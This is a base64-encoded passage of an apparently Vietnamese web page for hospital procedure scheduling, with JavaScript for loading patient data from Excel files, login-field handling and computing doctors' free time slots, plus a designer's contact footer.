GFsID0gMTAwMDsNCiAgICB9DQoNCiAgICBjb25zdCBzdGVwID0gMTAwOw0KICAgIGNvbnN0IHN0ZXBzID0gTWF0aC5jZWlsKHRvdGFsIC8gc3RlcCk7DQogICAgY29uc3QgaW50ZXJ2YWwgPSAyNjAwIC8gc3RlcHM7DQoNCiAgICBmb3IgKGxldCBpID0gMTsgaSA8PSBzdGVwczsgaSsrKSB7DQogICAgICAgIGNvbnN0IGN1cnJlbnQgPSBNYXRoLm1pbihpICogc3RlcCwgdG90YWwpOw0KICAgICAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6IzI5ODBiOTttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkGFuZyBwaMOibiB0w61jaCBk4buvIGxp4buHdSB04burbmcgYuG7h25oIG5ow6JuLi4uPGJyPicgKyBjdXJyZW50ICsgJyAvICcgKyB0b3RhbDsNCiAgICAgICAgYXdhaXQgbmV3IFByb21pc2UociA9PiBzZXRUaW1lb3V0KHIsIGludGVydmFsKSk7DQogICAgfQ0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtY2hlY2stY2lyY2xlIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6Z3JlZW47bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJDDoyBraeG7g20gdHJhIHhvbmcuLi4nOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzEwMCUnOw0KICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCAxMDAwKSk7DQoNCmlmICghd2luZG93LmlzS2hvYUxvaSkgew0KICAgIHBvcHVwLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgfSwgNTAwKTsNCg0KDQp9DQoNCg0KDQogZWxzZSB7DQogICAgLy8gTuG6v3UgxJFhbmcgbOG7l2kgS2hvYSwgS0jDlE5HIMSRxrDhu6NjIOG6qW4gcG9wdXANCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCn0NCiAgICBoYW5kbGVGaWxlKCk7DQoJDQoJDQoJDQoJDQpzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAvLyDinYwgTuG6v3UgxJFhbmcgbOG7l2kgdMOqbiBraG9hIHRow6wgZ2nhu68gbmd1ecOqbiBwb3B1cCwgS0jDlE5HIMSRxrDhu6NjIOG6qW4sIEtIw5RORyBoaeG7h24gbsO6dA0KICAgIGlmICh3aW5kb3cuaXNLaG9hTG9pKSB7DQogICAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIOKchSBO4bq/dSBraMO0bmcgbOG7l2ksIHRow6wg4bqpbiBwb3B1cCB2w6AgaGnhu4duIG7DunQgY2jhu6ljIG7Eg25nDQogICAgcG9wdXAuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOw0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQoNCiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b24uYnRuJykuZm9yRWFjaChidG4gPT4gew0KICAgICAgICBpZiAoYnRuLnRleHRDb250ZW50LmluY2x1ZGVzKCdHaeG7nSB0cuG7kW5nJykgfHwgYnRuLnRleHRDb250ZW50LmluY2x1ZGVzKCdT4bqvYyB0aHXhu5FjIHRoYW5nJykpIHsNCiAgICAgICAgICAgIGJ0bi5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7DQogICAgICAgIH0NCiAgICB9KTsNCn0sIDUwMCk7DQoNCg0KCQ0KfSk7DQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gZHJvcGRvd24gbOG7jWMNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlckJ5T3BlcmF0b3IpOw0KICAgICAgICAgICAgDQoJCQkNCgkJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmaWx0ZXJCeU9wZXJhdG9yKTsNCgkJCQ0KCQkJDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyByYWRpbyBidXR0b24gY2jhu41uIGtodW5nIGdp4budDQogICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dFtuYW1lPSJ0aW1lT3B0aW9uIl0nKS5mb3JFYWNoKHJhZGlvID0+IHsNCiAgICAgICAgICAgICAgICByYWRpby5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGFsbFByb2NlZHVyZXMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMoYWxsUHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0pOw0KCQkJDQoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQp9KTsNCg0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdEVycm9yJykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24gKCkgew0KICAgLy8gY2jhu4kgcmVuZGVyIGzhuqFpLCBLSMOUTkcgxJHhu6VuZyBkcm9wZG93biBiw6puIGtpYQ0KICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KIH0pOw0KCQkJDQogICAgICAgIH0pOw0KICAgIDwvc2NyaXB0Pg0KPGRpdiBjbGFzcz0icHJvY2VkdXJlLWluZm8iPjxjZW50ZXI+IA0KRGVzaWduIEJ5IDxhIGhyZWY9Imh0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNCIgdGFyZ2V0PSJfYmxhbmsiPiBEci5DaMOidTwvYT48YnIvPg0KICAgICAgICAgICAgICAgIE7hur91IEPDsyBC4bqldCBL4buzIFbGsOG7m25nIE3huq9jIEfDrCBWdWkgTMOybmcgTEggOiA8YnIvPg0KICAgICAgICAgICAgICAgIEVtYWlsOiBjaGF1aHV5bmgwMTA0QGdtYWlsLmNvbTxici8+DQogICAgICAgICAgICAgICAgU0RUOiAwNzkuNTY3LjkzNTA8L2NlbnRlcj4NCjwvZGl2Pg0KPHNjcmlwdD4NCiAgLy8gSOG7lyB0cuG7oyBuaOG6pW4gRW50ZXIgdOG7qyDDtCB1c2VybmFtZSBob+G6t2MgcGFzc3dvcmQNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgaWYgKGV2ZW50LmtleSA9PT0gJ0VudGVyJykgew0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS5mb2N1cygpOw0KICAgIH0NCiAgfSk7DQoNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgaWYgKGV2ZW50LmtleSA9PT0gJ0VudGVyJykgew0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJykuY2xpY2soKTsNCiAgICB9DQogIH0pOw0KDQovLyA9PT09PT0gVOG7sCDEkOG7mE5HIFFVw4lUIFRIxq8gTeG7pEMgJiBDSOG7jE4gRklMRSBN4buaSSBOSOG6pFQgPT09PT09DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9sZGVySW5wdXQnKS5jbGljaygpOw0KfSk7DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGFzeW5jIChlKSA9PiB7DQogYXdhaXQgZW5zdXJlWExTWCgpOyAvLyBu4bqhcCBYTFNYIHRyxrDhu5tjIGtoaSDEkeG7jWMgd29ya2Jvb2sNCiAgICBjb25zdCBmaWxlcyA9IEFycmF5LmZyb20oZS50YXJnZXQuZmlsZXMpLmZpbHRlcihmID0+IC9cLih4bHN4fHhsc3xjc3YpJC9pLnRlc3QoZi5uYW1lKSk7DQogICAgY29uc3Qgc3RhdHVzRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKTsNCiAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQoNCiAgICBpZiAoZmlsZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICdyZWQnOw0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gJ0tow7RuZyB0w6xtIHRo4bqleSBmaWxlIEV4Y2VsIGjhu6NwIGzhu4cgdHJvbmcgdGjGsCBt4bulYy4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgbGV0IHZhbGlkRmlsZSA9IG51bGw7DQoNCiAgICBmb3IgKGNvbnN0IGZpbGUgb2YgZmlsZXMuc29ydCgoYSwgYikgPT4gYi5sYXN0TW9kaWZpZWQgLSBhLmxhc3RNb2RpZmllZCkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCBmaWxlLmFycmF5QnVmZmVyKCk7DQogICAgICAgICAgICBjb25zdCB3b3JrYm9vayA9IFhMU1gucmVhZChkYXRhLCB7IHR5cGU6ICdhcnJheScgfSk7DQoNCiAgICAgICAgICAgIGlmICghd29ya2Jvb2suU2hlZXROYW1lc1sxXSkgY29udGludWU7IC8vIGPhuqduIFNoZWV0IHRo4bupIDINCg0KICAgICAgICAgICAgY29uc3Qgc2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihzaGVldCwgeyBoZWFkZXI6IDEsIGRlZnZhbDogIiIsIGJsYW5rcm93czogdHJ1ZSB9KTsNCg0KICAgICAgICAgICAgaWYgKGpzb25EYXRhLmxlbmd0aCA+PSAxMCkgeyAvLyDDrXQgbmjhuqV0IDIgZMOybmcgaGVhZGVyIHbDoCBjw7MgZOG7ryBsaeG7h3UgZMOybmcgMTANCiAgICAgICAgICAgICAgICB2YWxpZEZpbGUgPSBmaWxlOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEzhu5dpIMSR4buNYyBmaWxlICR7ZmlsZS5uYW1lfTpgLCBlcnIpOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKHZhbGlkRmlsZSkgew0KICAgICAgICBjb25zdCBkdCA9IG5ldyBEYXRhVHJhbnNmZXIoKTsNCiAgICAgICAgZHQuaXRlbXMuYWRkKHZhbGlkRmlsZSk7DQogICAgICAgIGZpbGVJbnB1dC5maWxlcyA9IGR0LmZpbGVzOw0KDQogICAgICAgIC8vIGPhuq1wIG5o4bqtdCB0cuG6oW5nIHRow6FpDQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSBgPGkgY2xhc3M9ImZhcyBmYS1mb2xkZXItb3BlbiI+PC9pPiDEkMOjIGNo4buNbiBmaWxlOiA8Yj4ke3ZhbGlkRmlsZS5uYW1lfTwvYj5gOw0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICcjMmMzZTUwJzsNCg0KICAgICAgICAvLyBH4buNaSBraeG7g20gdHJhDQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJykuY2xpY2soKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuY29sb3IgPSAncmVkJzsNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9ICdLaMO0bmcgdMOsbSDEkcaw4bujYyBmaWxlIGPDsyBj4bqldSB0csO6YyBo4bujcCBs4buHLiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaS4nOw0KICAgIH0NCn0pOw0KDQoNCjwvc2NyaXB0Pg0KPGRpdiBjbGFzcz0idG9hc3QiIGlkPSJ0b2FzdCI+PC9kaXY+DQo8IS0tIFBvcHVwIGxvYWRpbmcgLS0+DQo8ZGl2IGlkPSJsb2FkaW5nUG9wdXAiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSk7ei1pbmRleDo5OTk5O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO2ZvbnQtZmFtaWx5OidJbnRlcicsc2Fucy1zZXJpZiI+DQo8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOiNmZmY7cGFkZGluZzozMHB4IDQwcHg7Ym9yZGVyLXJhZGl1czoxMHB4O3RleHQtYWxpZ246Y2VudGVyO2JveC1zaGFkb3c6MCAwIDE1cHggcmdiYSgwLDAsMCwwLjMpO21heC13aWR0aDo5MCU7Zm9udC1zaXplOjE4cHgiPg0KPGRpdiBpZD0ibG9hZGluZ1RleHQiPg0KPGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojMzQ5OGRiO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgxJBhbmcgZ+G7rWkgZOG7ryBsaeG7h3UgduG7gSBtw6F5IGNo4bunLi4uDQogICAgPC9kaXY+DQo8ZGl2IGlkPSJwcm9ncmVzc0JhckNvbnRhaW5lciI+DQo8ZGl2IGlkPSJwcm9ncmVzc0JhciI+PC9kaXY+DQo8ZGl2IGlkPSJhdmFpbGFiaWxpdHlUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi10b3A6IDIwcHg7Ij4NCiAgPGgyPlRo4buRbmcga8OqIGdp4budIHRy4buRbmcgdOG7q25nIG5nxrDhu51pPC9oMj4NCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgPHRoZWFkPg0KICAgICAgPHRyPg0KICAgICAgICA8dGg+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgIA0KICAgICAgICA8dGg+R2nhu50gdHLhu5FuZyBideG7lWkgc8Ohbmc8L3RoPg0KICAgICAgICA8dGg+R2nhu50gdHLhu5FuZyBideG7lWkgY2hp4buBdTwvdGg+DQogICAgICA8L3RyPg0KICAgIDwvdGhlYWQ+DQogICAgPHRib2R5IGlkPSJhdmFpbGFiaWxpdHlCb2R5Ij48L3Rib2R5Pg0KICA8L3RhYmxlPg0KPC9kaXY+DQo8IS0tIEvhur5UIFRIw5pDOiBC4bqiTkcgR0nhu5wgVFLhu5BORyBU4buqTkcgTkfGr+G7nEkgLS0+DQo8L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCg0KPHNjcmlwdD4NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCBmdW5jdGlvbigpIHsNCiAgY29uc3Qgbm9pZHVuZyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJub2lkdW5nIik7DQogIGNvbnN0IGxpc3QxID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLmxpc3QxIik7DQoNCiAgaWYgKG5vaWR1bmcgJiYgbGlzdDEpIHsNCiAgICBjb25zdCB0ZXh0ID0gbm9pZHVuZy50ZXh0Q29udGVudCB8fCBub2lkdW5nLmlubmVyVGV4dCB8fCAiIjsNCiAgICBpZiAodGV4dC50cmltKCkgPT09ICIiKSB7DQogICAgICBsaXN0MS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIH0NCiAgfQ0KfSk7DQoNCi8vID09PT0gVMONTkggVE/DgU4gR0nhu5wgVFLhu5BORyBDSE8gVOG7qk5HIE5Hxq/hu5xJID09PT0NCg0KDQoNCmZ1bmN0aW9uIHRvZ2dsZUF2YWlsYWJpbGl0eSgpIHsNCiAgICBjb25zdCB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlUYWJsZScpOw0KICAgIGNvbnN0IGZpbHRlckJsb2NrID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eUZpbHRlckJsb2NrJyk7DQogICAgaWYgKHRhYmxlLnN0eWxlLmRpc3BsYXkgPT09ICdub25lJykgew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgaWYgKGZpbHRlckJsb2NrKSBmaWx0ZXJCbG9jay5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgY2FsY3VsYXRlQXZhaWxhYmlsaXR5KCk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgaWYgKGZpbHRlckJsb2NrKSBmaWx0ZXJCbG9jay5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBjYWxjdWxhdGVBdmFpbGFiaWxpdHkoKSB7DQogICAgY29uc3QgZ3JvdXBzID0ge307DQogICAgYWxsUHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICBjb25zdCBrZXkgPSBgJHtwcm9jLm9wZXJhdG9yfV8ke3Byb2MuZGF0ZX1gOw0KICAgICAgICBpZiAoIWdyb3Vwc1trZXldKSBncm91cHNba2V5XSA9IFtdOw0KICAgICAgICBncm91cHNba2V5XS5wdXNoKHByb2MpOw0KICAgIH0pOw0KDQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5Qm9keScpOw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgY29uc3Qgc2VsZWN0ZWRPcCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpPy52YWx1ZSB8fCAnYWxsJzsNCiAgICBjb25zdCBzZWxlY3RlZERhdGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyRGF0ZScpPy52YWx1ZSB8fCAnYWxsJzsNCg0KICAgIC8vIENo4buJIGto4bufaSB04bqhbyBkcm9wZG93biAxIGzhuqduDQogICAgaWYgKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyT3BlcmF0b3InKS5kYXRhc2V0LmluaXRpYWxpemVkKSB7DQogICAgICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KGFsbFByb2NlZHVyZXMubWFwKHAgPT4gcC5vcGVyYXRvcikpXS5zb3J0KCk7DQogICAgICAgIGNvbnN0IGRhdGVzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLmRhdGUpKV0uc29ydCgoYSwgYikgPT4gew0KICAgICAgICAgICAgY29uc3QgW2RhLCBtYSwgeWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgY29uc3QgW2RiLCBtYiwgeWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLCBtYSAtIDEsIGRhKSAtIG5ldyBEYXRlKHliLCBtYiAtIDEsIGRiKTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgb3BTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyT3BlcmF0b3InKTsNCiAgICAgICAgY29uc3QgZGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk7DQoNCiAgICAgICAgb3BTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgICAgIGRhdGVTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICAgICAgZGF0ZXMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBvcFNlbGVjdC5kYXRhc2V0LmluaXRpYWxpemVkID0gJ3RydWUnOw0KICAgICAgICBkYXRlU2VsZWN0LmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQoNCiAgICAgICAgb3BTZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgY2FsY3VsYXRlQXZhaWxhYmlsaXR5KTsNCiAgICAgICAgZGF0ZVNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBjYWxjdWxhdGVBdmFpbGFiaWxpdHkpOw0KICAgIH0NCg0KICAgIE9iamVjdC5rZXlzKGdyb3VwcykuZm9yRWFjaChrZXkgPT4gew0KICAgICAgICBjb25zdCBbb3BlcmF0b3IsIGRhdGVdID0ga2V5LnNwbGl0KCdfJyk7DQogICAgICAgIGlmICgoc2VsZWN0ZWRPcCAhPT0gJ2FsbCcgJiYgb3BlcmF0b3IgIT09IHNlbGVjdGVkT3ApIHx8DQogICAgICAgICAgICAoc2VsZWN0ZWREYXRlICE9PSAnYWxsJyAmJiBkYXRlICE9PSBzZWxlY3RlZERhdGUpKSByZXR1cm47DQoNCiAgICAgICAgY29uc3QgcHJvY2VkdXJlcyA9IGdyb3Vwc1trZXldOw0KICAgICAgICBwcm9jZWR1cmVzLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCg0KICAgICAgICBjb25zdCBtb3JuaW5nU3RhcnQgPSA3ICogMzYwMDsNCiAgICAgICAgY29uc3QgbW9ybmluZ0VuZCA9IDExLjUgKiAzNjAwOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25TdGFydCA9IDEzLjUgKiAzNjAwOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25FbmQgPSAxNyAqIDM2MDA7DQoNCiAgICAgICAgY29uc3QgbW9ybmluZ0ZyZWUgPSBnZXRGcmVlU2xvdHMocHJvY2VkdXJlcywgbW9ybmluZ1N0YXJ0LCBtb3JuaW5nRW5kKTsNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uRnJlZSA9IGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBhZnRlcm5vb25TdGFydCwgYWZ0ZXJub29uRW5kKTsNCg0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD48YSBocmVmPSIjIiBvbmNsaWNrPSJzaG93UHJvY2VkdXJlc0Zvck9wZXJhdG9yKFxgJHtvcGVyYXRvcn1cYCwgXGAke2RhdGV9XGApO3JldHVybiBmYWxzZTsiIHN0eWxlPSJjb2xvcjojMzQ5OGRiO2ZvbnQtd2VpZ2h0OmJvbGQiPiR7b3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC9hPjwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtkYXRlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHttb3JuaW5nRnJlZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7YWZ0ZXJub29uRnJlZX08L3RkPg0KICAgICAgICBgOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0pOw0KfQ0KDQoNCmZ1bmN0aW9uIGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBzdGFydCwgZW5kKSB7DQogICAgY29uc3QgYnVzeSA9IHByb2NlZHVyZXMubWFwKHAgPT4gKHsNCiAgICAgICAgc3RhcnQ6IHAuc3RhcnQsDQogICAgICAgIGVuZDogcC5lbmQgKyAoKHAucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjApDQogICAgfSkpLmZpbHRlcihwID0+IHAuZW5kID4gc3RhcnQgJiYgcC5zdGFydCA8IGVuZCk7DQoNCiAgICBidXN5LnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCg0KICAgIGNvbnN0IGZyZWUgPSBbXTsNCiAgICBsZXQgY3Vyc29yID0gc3RhcnQ7DQoNCiAgICBmb3IgKGNvbnN0IGIgb2YgYnVzeSkgew0KICAgICAgICBpZiAoYi5zdGFydCA+IGN1cnNvciAmJiBiLnN0YXJ0ID4gc3RhcnQgJiYgY3Vyc29yIDwgZW5kKSB7DQogICAgICAgICAgICBjb25zdCBmcmVlU3RhcnQgPSBNYXRoLm1heChjdXJzb3IsIHN0YXJ0KTsNCiAgICAgICAgICAgIGNvbnN0IGZyZWVFbmQgPSBNYXRoLm1pbihiLnN0YXJ0LCBlbmQpOw0KICAgICAgICAgICAgaWYgKGZyZWVFbmQgPiBmcmVlU3RhcnQpIHsNCiAgICAgICAgICAgICAgICBmcmVlLnB1c2goYCR7Zm9ybWF0VGltZShmcmVlU3RhcnQpfSAtICR7Zm9ybWF0VGltZShmcmVlRW5kKX1gKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjdXJzb3IgPSBNYXRoLm1heChjdXJzb3IsIGIuZW5kKTsNCiAgICB9DQoNCiAgICBpZiAoY3Vyc29yIDwgZW5kKSB7DQogICAgICAgIGZyZWUucHVzaChgJHtmb3JtYXRUaW1lKGN1cnNvcil9IC0gJHtmb3JtYXRUaW1lKGVuZCl9YCk7DQogICAgfQ0KDQogICAgcmV0dXJuIGZyZWUubGVuZ3RoID8gZnJlZS5qb2luKCc8YnI+JykgOiAnPGk+S2jDtG5nIGPDsm4gdHLhu5FuZzwvaT4nOw0KfQ0KDQpmdW5jdGlvbiBmb3JtYXRUaW1lKHNlYykgew0KICAgIGNvbnN0IGggPSBNYXRoLmZsb29yKHNlYyAvIDM2MDApOw0KICAgIGNvbnN0IG0gPSBNYXRoLmZsb29yKChzZWMgJSAzNjAwKSAvIDYwKTsNCiAgICByZXR1cm4gaC50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJykgKyAnaCcgKyBtLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKTsNCn0NCg0KZnVuY3Rpb24gc2hvd1Byb2NlZHVyZXNGb3JPcGVyYXRvcihvcGVyYXRvciwgZGF0ZSkgew0KICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlT3ZlcmxheScpOw0KICAgIGNvbnN0IGNvbn